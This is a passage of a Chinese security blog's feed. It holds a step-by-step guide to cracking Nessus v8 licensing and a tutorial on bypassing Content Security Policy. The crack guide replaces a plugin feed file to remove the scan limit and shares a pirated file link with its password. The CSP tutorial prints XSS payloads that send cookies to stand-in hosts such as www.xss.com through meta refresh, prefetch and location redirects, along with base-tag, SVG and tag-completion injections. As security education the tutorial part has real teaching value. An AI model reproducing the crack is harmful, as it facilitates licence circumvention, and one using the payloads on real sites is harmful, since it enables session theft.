title="（2）正向代理"></a>（2）正向代理</h4><p>使用 <code>-L</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="代理" scheme="http://j0k3r.top/tags/%E4%BB%A3%E7%90%86/"/>
    
      <category term="SSH" scheme="http://j0k3r.top/tags/SSH/"/>
    
  </entry>
  
  <entry>
    <title>Nessus v8.x 永久破解方法</title>
    <link href="http://j0k3r.top/2020/01/05/nessus-crack/"/>
    <id>http://j0k3r.top/2020/01/05/nessus-crack/</id>
    <published>2020-01-04T16:00:00.000Z</published>
    <updated>2020-03-26T10:18:42.762Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><blockquote><p>Nessus 作为一款出色的漏洞扫描工具，有时候还是有奇效的 ：），之前用的免费版，对扫描数量有 16 个 ip 的限制，着实不太友好，macOS 下破解有少许差别，于是对破解过程进行简单记录</p></blockquote><p>系统环境：macOS 10.14.6</p><h2 id="0x01-破解方法"><a href="#0x01-破解方法" class="headerlink" title="0x01 破解方法"></a>0x01 破解方法</h2><h3 id="1-安装-Nessus"><a href="#1-安装-Nessus" class="headerlink" title="1. 安装 Nessus"></a>1. 安装 Nessus</h3><p>直接到 Nessus 官网：<a href="https://www.tenable.com/downloads/nessus" target="_blank" rel="noopener">https://www.tenable.com/downloads/nessus</a> 下载对应系统版本的 Nessus，基本上主流平台都有</p><p>在 macOS 下，安装成功后的 Nessus 目录位于 <code>/Library/Nessus/</code></p><p>Nessus 默认地址为：<a href="https://127.0.0.1:8834/" target="_blank" rel="noopener">https://127.0.0.1:8834/</a></p><p>安装完毕会自动打开浏览器，注意⚠️要选择 Managed Scanner 这项，然后在 Manageed by 下拉选择 Tenable.sc    ，Continue 即可，最后输入用户名和密码就 OK</p><h3 id="2-使用离线包安装更新"><a href="#2-使用离线包安装更新" class="headerlink" title="2. 使用离线包安装更新"></a>2. 使用离线包安装更新</h3><p>获取激活码</p><p><a href="https://zh-cn.tenable.com/products/nessus/activation-code?tns_redirect=true#nessus" target="_blank" rel="noopener">https://zh-cn.tenable.com/products/nessus/activation-code?tns_redirect=true#nessus</a></p><p>如果选择 Nessus Essentials 也就是免费版会来到一个注册界面</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/nessus-crack.assets/uetf9h2cxOUEbq8.jpg" alt></p><p>注册后邮箱会收到一个激活码</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/nessus-crack.assets/GbwNTYC7lXpR6F4.jpg" alt></p><p>然后访问 <a href="https://plugins.nessus.org/offline.php" target="_blank" rel="noopener">https://plugins.nessus.org/offline.php</a> 以下载获取 all-2.0.tar.gz 和  nessus-fetch.rc 文件</p><p>但是要先输入 challenge code 和 激活码</p><p>获取 challenge code，到 <code>/Library/Nessus/run/sbin</code> 使用命令行工具</p><p><code>nessuscli fetch --challeng</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/nessus-crack.assets/VnRr2KHA8suTZ6x.jpg" alt></p><p>到页面输入相应内容</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/nessus-crack.assets/QXmLlWsyu5Eh2RY.jpg" alt></p><p>得到两个文件链接，下载即可（ all-2.0.tar.gz 比较慢，要有耐心</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/nessus-crack.assets/OQ3JVB4o9PZSn7T.jpg" alt></p><p>下载完上面里那个文件就可以离线更新插件了</p><p><code>sudo ./nessuscli update ~/Downloads/all-2.0.tar.gz</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/nessus-crack.assets/sPRqGtZHCTuFa9n.jpg" alt></p><p>别忘了复制下载好的 nessus-fetch.rc 到 <code>/Library/Nessus/run/etc/nessus/nessus-fetch.rc</code></p><h3 id="3-替换文件"><a href="#3-替换文件" class="headerlink" title="3. 替换文件"></a>3. 替换文件</h3><p>以上步骤完成后要重启 Nessus，等待一会直到初始化成功</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/nessus-crack.assets/lPiKn5gfLrXSYO2.jpg" alt></p><p>将 plugin_feed_info.inc 文件替换到本地</p><p>共需替换两处：</p><ol><li><code>/Library/Nessus/run/var/nessus</code> 目录下</li></ol><ol start="2"><li><code>/Library/Nessus/run/lib/nessus/plugins</code> 目录下</li></ol><p>没有 plugin_feed_info.inc 也没关系，直接复制过去就好</p><p>最好改成一样的用户，组和权限</p><p><code>sudo chown root:admin ./plugin_feed_info.inc &amp;&amp; sudo chmod 644 ./plugin_feed_info.inc</code></p><p>最后重启 Nessus，等待初始化完成，登陆查看</p><p>许可已经变成了无限♾</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/nessus-crack.assets/pGOEIhlTJVc9WBx.jpg" alt></p><p>扫描终于没有了 16 个 ip 的限制</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/nessus-crack.assets/P6KSWmJhEQRiBkH.jpg" alt></p><hr><p>分享一个 plugin_feed_info.inc 文件</p><p>链接:<a href="https://pan.baidu.com/s/1o4EQvnbTGkGSxWJzThNInA" target="_blank" rel="noopener">https://pan.baidu.com/s/1o4EQvnbTGkGSxWJzThNInA</a>  </p><p>密码:nwdc</p><hr><p>Reference：</p><p><a href="https://mp.weixin.qq.com/s/jpOnANV1_l-xMfN6wVLrbQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jpOnANV1_l-xMfN6wVLrbQ</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://j0k3r.top/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>前端安全之 CSP 及其常见绕过</title>
    <link href="http://j0k3r.top/2019/11/19/csp-bypass/"/>
    <id>http://j0k3r.top/2019/11/19/csp-bypass/</id>
    <published>2019-11-18T16:00:00.000Z</published>
    <updated>2020-03-26T10:18:48.372Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h2 id="0x01-CSP-内容安全策略"><a href="#0x01-CSP-内容安全策略" class="headerlink" title="0x01 CSP (内容安全策略)"></a>0x01 CSP (内容安全策略)</h2><h3 id="1-CSP-是什么？"><a href="#1-CSP-是什么？" class="headerlink" title="1. CSP 是什么？"></a>1. CSP 是什么？</h3><blockquote><p>内容安全策略  (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。</p></blockquote><p>使用 CSP 的主要目的就是通过指定<strong>有效域</strong>防御 XSS 这类的攻击</p><h3 id="2-使用-CSP"><a href="#2-使用-CSP" class="headerlink" title="2. 使用 CSP"></a>2. 使用 CSP</h3><ol><li>使用 <code>Content-Security-Policy</code> HTTP 头 </li></ol><ol start="2"><li>html 标签</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CSP 限制类型</p><p>常见：</p><p><code>default-src</code> 能够设置其他指令的值，其他指令为下面这几个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">child-src//框架</span><br><span class="line">connect-src//HTTP 连接（通过 XHR、WebSockets、EventSource等）</span><br><span class="line">font-src//字体文件</span><br><span class="line">frame-src//&lt;frame&gt; 和 &lt;iframe&gt;</span><br><span class="line">img-src//图像</span><br><span class="line">manifest-src//manifest 文件</span><br><span class="line">media-src//媒体文件（音频和视频）</span><br><span class="line">object-src//插件（比如 Flash）</span><br><span class="line">prefetch-src//prefetch 和 prerender</span><br><span class="line">script-src//外部脚本</span><br><span class="line">script-src-elem//指定&lt;script&gt;有效来源，但未指定内嵌脚本事件处理程序（如onclick）</span><br><span class="line"></span><br><span class="line">script-src-attr//和 script-src-elem 相反</span><br><span class="line">style-src//样式表</span><br><span class="line">style-src-elem//指定 rel=&quot;stylesheet&quot; 样式的 &lt;style&gt; 和 &lt;link&gt;</span><br><span class="line">style-src-attr//指定单个DOM元素的内联样式有效来源</span><br><span class="line">worker-src//worker脚本</span><br></pre></td></tr></table></figure><p>其他：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">base-uri</span><br><span class="line">block-all-mixed-content//HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</span><br><span class="line">default-src</span><br><span class="line">form-action</span><br><span class="line">frame-ancestors</span><br><span class="line">navigate-to</span><br><span class="line">plugin-types//限制可以使用的插件格式</span><br><span class="line">referrer</span><br><span class="line">report-to</span><br><span class="line">report-uri</span><br><span class="line">require-sri-for</span><br><span class="line">sandbox//浏览器行为的限制，比如不能有弹出窗口等</span><br><span class="line">script-src-elem</span><br><span class="line">style-src-elem</span><br><span class="line">trusted-types</span><br><span class="line">upgrade-insecure-requests//自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</span><br></pre></td></tr></table></figure><p>常见选项值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">主机名：example.org，https://example.com:443</span><br><span class="line">路径名：example.org/resources/js/</span><br><span class="line">通配符：*.example.org，*://*.example.com:*（表示任意协议、任意子域名、任意端口）</span><br><span class="line">协议名：https:、data:</span><br><span class="line">关键字&apos;self&apos;：当前域名，需要加引号</span><br><span class="line">关键字&apos;none&apos;：禁止加载任何外部资源，需要加引号</span><br></pre></td></tr></table></figure><p>多个值可以并列，用空格分隔</p><p>外部脚本只能从 <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a> 域中加载，而 default-src 则限制其他资源只从自身加载</p><p><code>script-src</code> 的特殊值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;unsafe-inline&apos;：允许执行页面内嵌的&lt;script&gt;标签和事件监听函数</span><br><span class="line">unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。</span><br><span class="line">nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</span><br><span class="line">hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</span><br></pre></td></tr></table></figure><p>如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src https://example.com</span><br><span class="line"></span><br><span class="line">执行有 token 的脚本</span><br><span class="line">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;</span><br><span class="line">  // some code</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Content-Security-Policy: script-src &apos;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&apos;</span><br><span class="line"></span><br><span class="line">以下除 &lt;script&gt; 标签外的代码 hash 值等于设置值，所以会执行 </span><br><span class="line">&lt;script&gt;alert(&apos;Hello, world.&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>更多参数信息可以到 MDN Docs 查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/" target="_blank" rel="noopener">Content-Security-Policy - HTTP | MDN</a></p><h2 id="0x02-CSP-Bypass"><a href="#0x02-CSP-Bypass" class="headerlink" title="0x02 CSP Bypass"></a>0x02 CSP Bypass</h2><h3 id="1-URL-跳转"><a href="#1-URL-跳转" class="headerlink" title="1. URL 跳转"></a>1. URL 跳转</h3><h4 id="default-src-‘none’-时"><a href="#default-src-‘none’-时" class="headerlink" title="default-src ‘none’ 时"></a>default-src ‘none’ 时</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://www.xss.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure><h4 id="script-src-‘unsafe-inline’-时"><a href="#script-src-‘unsafe-inline’-时" class="headerlink" title="script-src ‘unsafe-inline’ 时"></a>script-src ‘unsafe-inline’ 时</h4><p>一些常用 javascript 重定向跳转方法</p><p>window.location</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.location="http://eval.php?c=cookie"</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>window.location.href</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">window.location.href="http://baidu.com"; </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>window.location.replace</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.location.replace("http://baidu.com")</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>window.open // Chrome 和 FireFox 默认会拦截弹出窗口</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.open("http://baidu.com")</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>self.location</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">self.location='http://baidu.com'; </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>top.location</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">top.location='http://baidu.com'; </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有个 window.navigate 只针对 IE，所以不推荐</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">document.location="http://baidu.com"</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">location.href="http://baidu.com"</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p> img、video、audio、iframe、a 等标签的 src 或 href 发起外域请求</p><h4 id="script-src-‘unsafe-eval’-时"><a href="#script-src-‘unsafe-eval’-时" class="headerlink" title="script-src ‘unsafe-eval’ 时"></a>script-src ‘unsafe-eval’ 时</h4><p>使用 eval 函数，结合 fromCharCode 可以 Bypass 一些常见过滤</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// c = 'document.location="http://baidu.com"'</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 61, 34, 104, 116, 116, 112, 58, 47, 47, 98, 97, 105, 100, 117, 46, 99, 111, 109, 34))</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="标签预加载"><a href="#标签预加载" class="headerlink" title="标签预加载"></a>标签预加载</h3><h4 id="1-dns-prefetch"><a href="#1-dns-prefetch" class="headerlink" title="1. dns-prefetch"></a>1. dns-prefetch</h4><p>dns-prefetch(DNS预解析) 允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析</p><p>在 <code>default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;;</code> 时可以使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[some thing].xxxx.ceye.io"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是测试 FireFox 好像不大行</p><p>注意替换域名的特殊字符满足域名的规则 <code>[.-a-zA-Z0-9]+</code></p><h4 id="2-prefetch"><a href="#2-prefetch" class="headerlink" title="2. prefetch"></a>2. prefetch</h4><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Link_prefetching_FAQ" target="_blank" rel="noopener">Link Prefetch</a> (页面资源预加载)</p><blockquote><p>它利用浏览器的空闲时间来下载或预取用户可能在不久的将来访问的文档。<br>网页向浏览器提供一组预取提示，并且在浏览器完成页面加载后，它开始以静默方式预取指定的文档并将其存储在其缓存中</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是本地测试新版 Chrome 和 FireFox 未成功</p><h3 id="标签补全"><a href="#标签补全" class="headerlink" title="标签补全"></a>标签补全</h3><p>比如使用 <code>Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;</code>，当 nonce 相同才能执行脚本时</p><p>如果是类似下面情况</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">"aa"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>插入 <code>&lt;script src=//xxx x=&quot;</code>, 结果为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//xxx</span> <span class="attr">x</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script id="</span><span class="attr">aa</span>" <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>虽然语法上提示有错误，但本地测试没有问题</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/csp-bypass.assets/7w6fAxl9bG2WFaU-20200109001529495.png" alt></p><p>xss 平台记录</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/csp-bypass.assets/q2C5pRsgaz7wFEr-20200109001532054.png" alt></p><h3 id="上传-JS-文件并引用"><a href="#上传-JS-文件并引用" class="headerlink" title="上传 JS 文件并引用"></a>上传 JS 文件并引用</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p><p>像这种只能加载同域 script 的 CSP 策略，就得从其自身域内下功夫了, 也可以控制其域内某个主机</p><p>其实也不一定非得是正常的 js 文件，如果有上传点，将 js 代码放在文件中，即文件中的内容被作为 js 代码解析</p><h3 id="base-标签改变资源加载域"><a href="#base-标签改变资源加载域" class="headerlink" title="base 标签改变资源加载域"></a>base 标签改变资源加载域</h3><p>default-src 默认并不会设置 base-uri，所以当遇到设置了 default-src 却没有 base-uri 时可以使用 base 标签更改页面上下文，这时页面中使用相对路径的 script 就可以加载 base 标签地址中相应的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-test'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"//my_ip/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"2.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>script 会请求 <code>my_ip/2.js</code></p><h3 id="代码重用"><a href="#代码重用" class="headerlink" title="代码重用"></a>代码重用</h3><p>就是利用 JS 库绕过 CSP </p><p>Blackhat 2017</p><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p><h3 id="同源-iframe-绕过"><a href="#同源-iframe-绕过" class="headerlink" title="同源 iframe 绕过"></a>同源 iframe 绕过</h3><p>一个同源站点，存在多个页面，这时如果其中有一个页面没有 CSP 保护或者不严格而存在 XSS 漏洞，则可以使用 iframe 访问其他页面以绕过 CSP 限制</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"other csp page"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var iframe = document.createElement('iframe');</span></span><br><span class="line"><span class="undefined">iframe.src="other csp page";</span></span><br><span class="line"><span class="undefined">document.body.appendChild(iframe);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="meta-标签"><a href="#meta-标签" class="headerlink" title="meta 标签"></a>meta 标签</h3><p>绕过 CSP nonce</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"cache-control"</span> <span class="attr">content</span>=<span class="string">"public"</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="svg-上传"><a href="#svg-上传" class="headerlink" title="svg 上传"></a>svg 上传</h3><p>如果能上传 svg 矢量图片的话，就可以使用 svg 进行 xss</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">id</span>=<span class="string">"Layer_1"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">x</span>=<span class="string">"0px"</span> <span class="attr">y</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 751 751"</span> <span class="attr">enable-background</span>=<span class="string">"new 0 0 751 751"</span> <span class="attr">xml:space</span>=<span class="string">"preserve"</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">"image0"</span> <span class="attr">width</span>=<span class="string">"751"</span> <span class="attr">height</span>=<span class="string">"751"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="可控-JSONP-绕过"><a href="#可控-JSONP-绕过" class="headerlink" title="可控 JSONP 绕过"></a>可控 JSONP 绕过</h3><p>通过 JSONP 返回 js 数据，再借助 script 加载 js</p><p>举个栗子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://ip/js.php?f"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>js.php 内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: application/javascript'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        $src = <span class="string">'http://baidu.com'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span 